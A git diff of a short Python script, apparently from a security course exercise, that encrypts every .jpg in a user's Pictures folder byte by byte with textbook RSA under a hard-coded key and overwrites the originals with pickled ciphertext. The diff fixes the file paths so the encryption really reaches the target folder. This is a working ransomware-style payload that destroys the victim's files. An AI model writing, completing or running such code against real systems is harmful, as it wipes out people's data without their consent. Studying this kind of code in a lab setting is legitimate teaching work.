@@ -2,8 +2,7 @@
 import os
 import pickle
 
-# folder_name = "/home/csc2023/Pictures"
-folder_name = "/media/sf_codes"
+folder_name = "/home/csc2023/Pictures"
 
 public_key_n = 22291846172619859445381409012451
 public_key_e = 65535
@@ -13,8 +12,8 @@ folder = [p for p in os.listdir(folder_name) if p[-4:] == ".jpg"]
 
 for picture in folder:
     plain_bytes = b''
-    with open(picture, 'rb') as f:
+    with open(f'{folder_name}/{picture}', 'rb') as f:
         plain_bytes = f.read()
     cipher_bytes = [pow(i, public_key_e, public_key_n) for i in plain_bytes]
-    with open(picture, 'wb') as f:
+    with open(f'{folder_name}/{picture}', 'wb') as f:
         pickle.dump(cipher_bytes, f)
